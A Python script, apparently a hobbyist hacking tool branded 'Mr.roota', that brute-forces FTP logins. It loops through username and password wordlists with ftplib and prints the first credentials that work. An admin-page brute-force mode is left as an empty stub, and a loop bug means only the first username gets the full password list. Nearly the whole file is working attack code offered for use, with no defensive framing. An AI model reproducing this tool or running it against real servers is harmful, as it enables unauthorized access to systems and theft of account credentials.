import argparse
import ftplib
import time
import sys
import os
import pyfiglet
from colorama import Fore, Style
import tabulate

def print_logo():
    logo = pyfiglet.figlet_format("Mr.roota")
    print(Fore.CYAN + logo + Style.RESET_ALL)

def ftp_brute_force(target, user_file, pass_file):
    with open(user_file, 'r') as users, open(pass_file, 'r') as passwords:
        for user in users:
            for password in passwords:
                user = user.strip()
                password = password.strip()
                try:
                    print(Fore.YELLOW + f"Trying: {user}/{password}..." + Style.RESET_ALL)
                    ftp = ftplib.FTP(target)
                    ftp.login(user, password)
                    print(Fore.GREEN + f"Success! Found: {user}/{password}" + Style.RESET_ALL)
                    ftp.quit()
                    return user, password  # Return on first successful login
                except ftplib.error_perm:
                    continue  # Invalid login
                except Exception as e:
                    print(Fore.RED + f"Error: {str(e)}" + Style.RESET_ALL)
                    continue

    return None, None  # Return None if no valid login found

def admin_brute_force(target, user_file, pass_file):
    # Implement admin page brute force logic here
    pass  # Placeholder for future implementation

def main():
    print_logo()

    parser = argparse.ArgumentParser(description="Mr.root Brute Force Tool")
    parser.add_argument('u', help='Target URL or IP address')
    parser.add_argument('-L', help='Usernames file', default='users.txt')
    parser.add_argument('-P', help='Passwords file', default='pass.txt')
    parser.add_argument('--method', choices=['ftp', 'admin'], required=True, help='Choose the method: ftp or admin')

    args = parser.parse_args()
    
    target = args.u
    user_file = args.L
    pass_file = args.P
    method = args.method

    if method == 'ftp':
        user, password = ftp_brute_force(target, user_file, pass_file)
        if user and password:
            print(f"{Fore.GREEN}Found credentials: {user}:{password}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}No valid credentials found.{Style.RESET_ALL}")

    elif method == 'admin':
        admin_brute_force(target, user_file, pass_file)
        # For now, just a placeholder to indicate admin brute force would happen here.

if __name__ == "__main__":
    main()
